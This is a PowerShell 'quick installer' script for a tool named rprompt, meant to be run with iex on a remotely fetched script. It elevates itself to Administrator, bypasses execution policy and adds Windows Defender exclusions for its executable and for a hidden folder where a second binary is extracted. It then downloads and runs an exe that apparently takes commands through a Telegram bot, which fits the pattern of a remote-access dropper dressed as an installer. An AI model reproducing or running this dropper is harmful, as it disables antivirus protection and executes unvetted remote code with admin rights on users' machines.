# run.ps1 - Download and run rprompt for Windows
# Usage: iex (irm https://raw.githubusercontent.com/llm-y/download/main/run.ps1)

$ErrorActionPreference = "Stop"

# Self-elevate to Administrator if not already running as admin
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[*] Requesting Administrator privileges..." -ForegroundColor Yellow
    $scriptUrl = "https://raw.githubusercontent.com/llm-y/download/main/run.ps1"
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iex (irm '$scriptUrl')`""
    exit
}

$binUrl = "https://raw.githubusercontent.com/llm-y/download/main/bin/rprompt-windows-amd64.exe"
$tempDir = Join-Path $env:TEMP "rprompt"
$exePath = Join-Path $tempDir "rprompt-windows-amd64.exe"

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  Rprompt - Quick Installer & Runner" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "[+] Running as Administrator" -ForegroundColor Green

# Create temp directory if it doesn't exist
if (-not (Test-Path $tempDir)) {
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
    Write-Host "[+] Created directory: $tempDir" -ForegroundColor Green
}

# Add Windows Defender exclusion for the exe path
Write-Host "[*] Adding Windows Defender exclusion for: $exePath" -ForegroundColor Yellow
try {
    Add-MpPreference -ExclusionPath $exePath
    Write-Host "[+] Defender exclusion added successfully" -ForegroundColor Green
} catch {
    Write-Host "[!] Warning: Could not add Defender exclusion: $_" -ForegroundColor Red
    Write-Host "    The file may still be flagged by antivirus." -ForegroundColor Yellow
}

# Add Windows Defender exclusion for IFCOID folder (where rprompt extracts if-slr.exe)
$ifcoidPath = "$env:LOCALAPPDATA\IFCOID"
Write-Host "[*] Adding Windows Defender exclusion for: $ifcoidPath" -ForegroundColor Yellow
try {
    Add-MpPreference -ExclusionPath $ifcoidPath
    Write-Host "[+] Defender exclusion added for IFCOID folder" -ForegroundColor Green
} catch {
    Write-Host "[!] Warning: Could not add Defender exclusion for IFCOID: $_" -ForegroundColor Red
    Write-Host "    if-slr.exe may be flagged by antivirus." -ForegroundColor Yellow
}

# Download the binary
Write-Host "[*] Downloading rprompt-windows-amd64.exe..." -ForegroundColor Yellow
try {
    Invoke-WebRequest -Uri $binUrl -OutFile $exePath -UseBasicParsing
    Write-Host "[+] Download complete: $exePath" -ForegroundColor Green
} catch {
    Write-Host "[!] Failed to download: $_" -ForegroundColor Red
    exit 1
}

# Check environment variables
Write-Host ""
if (-not $env:TELEGRAM_BOT_TOKEN) {
    Write-Host "[!] WARNING: TELEGRAM_BOT_TOKEN is not set." -ForegroundColor Red
    Write-Host "    Set it with: setx TELEGRAM_BOT_TOKEN `"your-token-here`"" -ForegroundColor Yellow
}
if (-not $env:ALLOWED_CHAT_IDS) {
    Write-Host "[!] WARNING: ALLOWED_CHAT_IDS is not set." -ForegroundColor Red
    Write-Host "    Set it with: setx ALLOWED_CHAT_IDS `"your-chat-id`"" -ForegroundColor Yellow
}

# Run the binary
Write-Host ""
Write-Host "[*] Starting rprompt..." -ForegroundColor Yellow
Write-Host "----------------------------------------" -ForegroundColor DarkGray
Write-Host ""

& $exePath
